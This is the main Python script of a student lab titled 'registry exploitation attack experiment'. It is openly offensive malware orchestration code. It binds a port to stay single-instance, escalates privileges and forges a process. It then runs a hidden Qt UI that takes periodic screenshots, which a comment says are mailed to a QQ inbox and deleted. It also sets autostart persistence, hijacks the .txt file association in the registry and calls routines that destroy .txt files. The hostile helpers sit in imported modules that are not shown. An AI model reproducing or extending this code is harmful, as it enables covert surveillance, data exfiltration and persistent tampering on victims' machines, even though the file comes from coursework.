"""
    姓名：周以龙
    学号：18271341
    实验名：注册表利用攻击实验
"""

import hidden_ui
import RegistryOperator
import write_log

from datetime import datetime
from PyQt5 import QtWidgets
import sys
import socket

if __name__ == '__main__':
    try:
        s = socket.socket()
        host = socket.gethostname()
        s.bind((host, 65500))
        write_log.write_log('-----------------------------------------------------------------------------------\n')
        write_log.write_log(str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 程序正在监听65500端口，以确保一个实例运行\n')

        RegistryOperator.privilege_promote_backup()
        RegistryOperator.privilege_promote_restore()

        RegistryOperator.forge_process(1)

        app = QtWidgets.QApplication(sys.argv)
        hidden_ui.suppress_qt_warnings()
        ui = hidden_ui.HiddenUi()
        ui.show()
        write_log.write_log(str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> ui启动完成\n')
        write_log.write_log(
            str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 定时循环截图已开启\n')
        write_log.write_log(str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 正在\picture目录执行截图任务\n')
        # 定时截图并发送至qq邮箱，再删除截图
        ui.get_screen_shot()
        write_log.write_log(
            str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 循环发送截图已开启\n')
        hidden_ui.send_picture(10)

        # 自启动 修改txt打开方式 备份注册表文件
        RegistryOperator.self_start(True)
        RegistryOperator.modify_registry_txt()
        RegistryOperator.create_key_txt()

        if len(sys.argv) >= 2:
            ui.ui_destroy_txt()

        sys.exit(app.exec_())
    except OSError:
        write_log.write_log('-----------------------------------------------------------------------------------\n')
        write_log.write_log(
                str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 程序已经运行，执行任务后将退出！\n')
        if len(sys.argv) >= 2:
            RegistryOperator.destroy_txt()
        write_log.write_log(
                str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 任务完成，程序退出！\n')
        sys.exit()